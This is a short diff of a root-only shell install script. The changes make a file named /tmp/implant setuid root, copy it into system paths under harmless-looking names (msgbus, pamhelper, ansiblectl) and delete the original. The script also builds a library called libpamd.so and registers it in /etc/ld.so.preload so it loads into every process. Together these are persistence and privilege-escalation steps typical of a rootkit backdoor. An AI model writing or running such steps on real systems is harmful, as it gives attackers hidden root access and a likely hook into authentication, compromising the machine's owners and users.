@@ -5,11 +5,16 @@ if [[ $(/usr/bin/id -u) -ne 0 ]]; then
     exit
 fi
 
-chown root:root /usr/bin/msgbus
-chmod a+s /usr/bin/msgbus
+chown root:root /tmp/implant
+chmod a+s /tmp/implant
 
-apt-get install gcc make cmake
+cp /tmp/implant /usr/bin/msgbus
+cp /tmp/implant /usr/bin/pamhelper
+cp /tmp/implant /usr/bin/ansiblectl
+rm /tmp/implant
+
+apt-get -y install gcc make cmake
 make
 
-sudo mv libpamd.so /usr/local/lib/
+mv libpamd.so /usr/local/lib/libpamd.so
 echo /usr/local/lib/libpamd.so >> /etc/ld.so.preload
